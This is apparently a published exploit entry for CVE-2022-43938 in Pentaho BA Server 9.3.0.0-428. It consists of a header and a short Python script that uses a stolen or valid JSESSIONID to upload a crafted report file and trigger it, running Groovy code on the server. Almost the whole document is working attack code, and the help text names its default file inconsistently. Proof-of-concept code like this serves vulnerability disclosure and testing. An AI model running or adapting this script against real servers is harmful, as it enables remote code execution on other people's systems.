# Title: Pentaho BA Server EE 9.3.0.0-428 - RCE via Groovy Scripting (Authenticated)
# Author: dwbzn
# Date: 2022-04-04
# Vendor: https://www.hitachivantara.com/
# Software Link: https://www.hitachivantara.com/en-us/products/lumada-dataops/data-integration-analytics/download-pentaho.html
# Version: Pentaho BA Server 9.3.0.0-428
# CVE: CVE-2022-43938
# Tested on: Windows 11
# Credits: https://research.aurainfosec.io/pentest/pentah0wnage

# Authenticated RCE via Groovy Scripting (https://research.aurainfosec.io/pentest/pentah0wnage)
import requests
import argparse
from os import path


parser = argparse.ArgumentParser(description='CVE-XXXX - Authenticated RCE in Pentaho BA Server via HSQLDB\n\nUse Pentaho Report Designer to make a custom prpt (see AURAINFOSECLINK) and add it with -f', formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('baseurl', type=str, help='base url e.g. http://127.0.0.1:8080/pentaho')
parser.add_argument('-j', metavar='JSESSIONID', type=str, help='JSESSIONID of user with Create Content privileges', required=True)
parser.add_argument('-f', metavar='FILE', type=str, default='groovy.prpt', nargs='?', help='generated report file (defaults to writeshell.prpt which runs notepad.exe)', required=False)
args = parser.parse_args()

session = requests.session()
session.cookies.set("JSESSIONID",value=args.j)
upload = session.post(f'{args.baseurl}/api/repo/files/import', files=dict(importDir='/public',fileUpload=open(args.f,'rb')))
session.get(f'{args.baseurl}/api/repos/%3Apublic%3A{path.basename(args.f)}/reportjob')

if upload.status_code == 200:
    print("success! command should've executed.")
else:
    print("something went wrong.")